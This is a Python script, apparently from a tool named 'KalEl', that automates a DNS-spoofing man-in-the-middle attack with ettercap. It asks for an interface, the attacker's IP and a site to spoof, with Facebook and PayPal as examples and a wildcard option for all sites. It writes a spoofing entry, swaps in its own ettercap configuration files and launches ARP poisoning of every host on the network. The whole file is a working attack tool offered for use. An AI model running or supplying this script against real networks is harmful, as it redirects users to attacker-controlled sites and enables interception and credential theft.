#!/usr/bin/env python

import os
import time
import subprocess
import sys


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#Verify System and clean up afterlast usage
from pathlib2 import Path

file1 = Path("/opt/KalEl/etter.dns")
if file1.is_file():
    subprocess.call(['rm', '/opt/KalEl/etter.dns'])
else:
    pass

#Getting the Network Interface Card Information.
#This is the interface that ettercap will listen on.
print bcolors.OKGREEN
iface = raw_input('Whats is your network interface?\n (example: eth0, wlan0)\n Interface: ')
print ("Interface set to set to: %s.") % iface
iface = "%s" % iface
print ("\n")

#Define the attackers lan IP
lanip = raw_input('Whats is your ip?\n IP: ')
print ("LAN IP: %s.") % lanip

#Define the gateway IP
#gwip = raw_input('Whats is your Gateway/Router IP?\n IP: ')
#print 'Gateway IP: %s.' % gwip

print bcolors.ENDC
print bcolors.HEADER

#Getting the source address to spoof
print("What website do you wish to spoof?\n")
print("Examples: https://facebook.com https://paypal.com \n")
print("You can also spoof spesific or all subdomains by using wildcard")
print("Examples: *.facebook.com will spoof all subdomains including www \n")
print("If you want to spoof all websites you can use a wildcard by just typing *")
print bcolors.ENDC
print bcolors.OKGREEN
target = raw_input('Input Source to spoof\n URL: ')
print("Target address %s.") % target
print bcolors.ENDC

#Writes out the config to etter.dns
with open('etter.dns', 'w+') as f:
    f.writelines(target)
    f.write(' A ')
    f.writelines(lanip+'\n')

print("Backing up ettercap config and creating our own")

#Ettercap Config (etter.dns)
subprocess.call(['mv', '/etc/ettercap/etter.conf', '/etc/ettercap/etter.conf.bak'])
subprocess.call(['cp', '/opt/KalEl/etter.conf', '/etc/ettercap/etter.conf'])

#Ettercap DNS config (etter.dns)
subprocess.call(['mv', '/etc/ettercap/etter.dns', '/etc/ettercap/etter.dns.bak'])
subprocess.call(['cp', '/opt/KalEl/etter.dns', '/etc/ettercap/etter.dns'])
print 'Done!'

print bcolors.WARNING
#Starting up ettercap and launching the attack
print("Starting the Attack NOW!""\n")
print bcolors.ENDC
print bcolors.FAIL
print("#### NB: CTRL + C IS DISAPPRECIATED, USE Q FOR QUIT INSTEAD! ####")
print bcolors.ENDC
time.sleep(1)

if os.path.isfile('/opt/KalEl/src/config.py'):
    from src.config import etterdir
    subprocess.call([etterdir, '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
else:
    subprocess.call(['ettercap', '-T', '-q', '-i', iface, '-P', 'dns_spoof', '-M', 'ARP:remote', '///', '///',])
exit(1)
